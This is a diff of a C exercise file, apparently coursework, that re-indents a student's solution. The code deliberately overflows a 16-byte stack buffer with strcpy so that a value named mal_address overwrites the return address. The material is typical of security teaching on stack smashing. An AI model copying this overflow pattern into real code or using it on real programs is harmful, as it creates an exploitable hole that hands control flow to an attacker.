@@ -32,10 +32,10 @@ int main()
 
 			// Write your code here.
       
-      // Written by Itai Gu.
-      // I chose to use stack overflow attack.
+      			// Written by Itai Gu.
+      			// I chose to use stack overflow attack.
       
-      char buffer[25];
+      			char buffer[25];
 
 			for (int i = 0; i < 20; i++)
 				buffer[i] = 0x01;
@@ -46,8 +46,6 @@ int main()
 			int* pRetAddress = (int*)&(buffer[20]);
 			*pRetAddress = mal_address;
 			buffer[24] = (char)0x00;
-
-			//
 
 			char buf[16];
 			strcpy(buf, buffer);
